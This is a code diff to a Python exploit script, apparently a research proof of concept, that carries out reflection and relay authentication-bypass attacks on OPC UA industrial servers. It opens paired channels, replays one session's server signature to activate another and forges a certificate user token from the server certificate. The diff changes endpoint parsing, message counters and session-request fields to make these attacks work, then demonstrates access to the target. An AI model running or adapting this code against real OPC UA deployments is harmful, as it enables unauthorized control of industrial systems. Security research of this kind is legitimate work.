@@ -5,7 +5,7 @@ from crypto import *
 from datetime import datetime
 from socket import socket, create_connection
 
-import sys, os, itertools
+import sys, os, itertools, re
 
 # Logging and errors.
 def log(msg : str):
@@ -18,6 +18,13 @@ def log_success(msg : str):
 # unexpected errors, which can have all kinds of causes). 
 class AttackNotPossible(Exception):
   pass
+  
+def parse_endpoint_url(url):
+  m = re.match(r'opc\.tcp://(?P<host>[^:/]+):(?P<port>\d+)/', url)
+  if not m:
+    raise Exception(f'Don\'t know how to process endpoint url: {url}')
+  else:
+    return m.group('host', 'port')
 
 # Common routines.
 
@@ -86,7 +93,7 @@ def unencrypted_opn(sock: socket) -> ChannelState:
     sock=sock,
     channel_id=resp.securityToken.channelId,
     token_id=resp.securityToken.tokenId,
-    msg_counter=1,
+    msg_counter=2,
     crypto=None,
   )
 
@@ -133,7 +140,8 @@ def session_exchange(channel : ChannelState,
     
   # Parse the response.
   convo, _ = encodedConversation.from_bytes(decodedPart)
-  return respfield.from_bytes(convo.requestOrResponse)
+  resp, _ = respfield.from_bytes(convo.requestOrResponse)
+  return resp
   
 
 # Relevant endpoint information.
@@ -156,20 +164,9 @@ def get_endpoints(host : str, port: int) -> List[EndpointInfo]:
       localeIds=[],
       profileUris=[],
     )
-  
-  def parse_epurl(url):
-    m = re.match(r'opc\.tcp://(?P<host>[^:/]+):(?P<port>\d+)/', url)
-    if not m:
-      raise Exception(f'Don\'t know how to process endpoint url: {url}')
-    else:
-      return m.group('host', 'port')
       
   # Only return endpoints that use the binary protocol.
-  return [EndpointInfo(
-    *parse_epurl(ep.endpointUrl), ep.serverCertificate, 
-    ep.securityPolicyUri, ep.messageSecurityMode,
-    any(t.tokenType == CERTIFICATE for t in ep.userIdentityTokens)
-  ) for ep in resp.endpoints if ep.transportProfileUri.endswith('uabinary')]
+  return [ep for ep in resp.endpoints if ep.transportProfileUri.endswith('uabinary')]
 
 
 def execute_relay_attack(
@@ -181,6 +178,7 @@ def execute_relay_attack(
         requestHeader=simple_requestheader(),
         clientDescription=client_ep.server,
         serverUri=server_ep.server.applicationUri,
+        endpointUrl=server_ep.endpointUrl,
         sessionName=None,
         clientNonce=nonce,
         clientCertificate=client_ep.serverCertificate,
@@ -199,7 +197,7 @@ def execute_relay_attack(
     cert_policies = [p for p in login_endpoint.userIdentityTokens if p.tokenType == UserTokenType.CERTIFICATE]
     if anon_policies:
       usertoken = anonymousIdentityToken.create(policyId=anon_policies[0].policyId)
-      usersig = None
+      usersig = signatureData.create(algorithm=None,signature=None)
     elif cert_policies:
       log('User certificate required. Reusing the server certificate to forge user token.')
       usertoken = x509IdentityToken.create(
@@ -211,6 +209,9 @@ def execute_relay_attack(
       usersig = createresp2.serverSignature
     else:
       raise AttackNotPossible('Endpoint does not allow either anonymous or certificate-based authentication.')
+    
+    if createresp2.serverSignature.signature is None:
+      log('Server did not sign the CreateSessionResponse. Is unauthenticated access allowed? In this case no reflection attack is needed.')
     
     # Now activate the first session using the signature from the second session.
     session_exchange(login_chan, activateSessionRequest, activateSessionResponse, 
@@ -292,14 +293,15 @@ def reflect_attack(address : Tuple[str, int]):
   log(f'Server advertises {len(endpoints)} endpoints.')
   
   # Try attack against first endpoint with a NONE policy.
-  none_eps = [ep for ep in endpoints if ep.policy == SecurityPolicy.NONE]
+  none_eps = [ep for ep in endpoints if ep.securityPolicyUri == SecurityPolicy.NONE]
   if none_eps:
     target = none_eps[0]
-    log(f'Targeting {target.host}:{target.port} with NONE security policy.')
-    with connect_and_hello(target.host, target.port) as sock1, connect_and_hello(target.host, target.port) as sock2:
+    thost, tport = parse_endpoint_url(target.endpointUrl)
+    log(f'Targeting {thost}:{tport} with NONE security policy.')
+    with connect_and_hello(thost, tport) as sock1, connect_and_hello(thost, tport) as sock2:
       mainchan, oraclechan = unencrypted_opn(sock1), unencrypted_opn(sock2)
       token = execute_relay_attack(oraclechan, target, mainchan, target)
-      log_success(f'Attack succesfull! Authenticated session set up with {target.host}.')
+      log_success(f'Attack succesfull! Authenticated session set up with {target.endpointUrl}.')
       demonstrate_access(mainchan, token)
   else:
     raise AttackNotPossible('TODO: implement combination with OPN attack.')
@@ -313,12 +315,14 @@ def relay_attack(source : Tuple[str, int], target : Tuple[str, int]):
   log(f'Listed {len(teps)} endpoints from {a2url(target)}.')
   
   for sep, tep in itertools.product(seps, teps):
-    if sep.policy == tep.policy == SecurityPolicy.NONE:
-      log(f'Trying endpoints {a2url((sep.host, sep.port))} -> {a2url((tep.host, tep.port))} (both NONE security policy)')
-      with connect_and_hello(sep.host, sep.port) as ssock, connect_and_hello(tep.host, tep.port) as tsock:
+    if sep.securityPolicyUri == tep.securityPolicyUri == SecurityPolicy.NONE:
+      log(f'Trying endpoints {sep.endpointUrl} -> {tep.endpointUrl} (both NONE security policy)')
+      shost, sport = parse_endpoint_url(sep.endpointUrl)
+      thost, tport = parse_endpoint_url(tep.endpointUrl)
+      with connect_and_hello(shost, sport) as ssock, connect_and_hello(thost, tport) as tsock:
         mainchan, oraclechan = unencrypted_opn(tsock), unencrypted_opn(ssock)
         token = execute_relay_attack(oraclechan, sep, mainchan, tep)
-        log_success(f'Attack succesfull! Authenticated session set up with {tep.host}.')
+        log_success(f'Attack succesfull! Authenticated session set up with {tep.endpointUrl}.')
         demonstrate_access(mainchan, token)
         return
   
